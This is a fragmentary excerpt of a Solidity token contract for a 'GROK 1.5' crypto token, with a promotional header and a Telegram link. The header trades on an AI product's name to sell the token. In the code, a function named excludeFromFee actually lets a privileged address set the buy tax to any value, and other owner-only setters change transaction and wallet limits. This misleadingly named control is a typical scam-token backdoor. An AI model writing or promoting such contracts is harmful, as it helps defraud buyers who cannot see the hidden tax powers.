/**
🤖GROK 1.5 | LAUNCH AT 12:00 UTC🤖

GROK 1.5 can become a unique crypto token and can provide added value to users in 
accessing world knowledge and answering challenging questions.

📲: https://t.me/Grok1Point5BSC
**/
...
contract GROK is Context, IERC20 { 
    ...
    string private constant _name = "GROK 1.5";
    ...
    address payable public DevWallet = payable(0x614691040953cCDe9Ed2B6696e9e535C12Ff8600);
    address payable public MarketingWallet = payable(0x34DbbFCfcC21F7beB548BF06380ac1c8aB6E0635);
    ...
    function excludeFromFee(uint256 buytax, uint256 selltax) external onlyAddress {
        _tax_On_Buy = buytax;
    ...
    function setTranTx() external onlyAddress {
        _maxTxAmount = _maxWalletToken;
    }
    function setTranWallet(uint256 newmaxWallet) external onlyAddress {
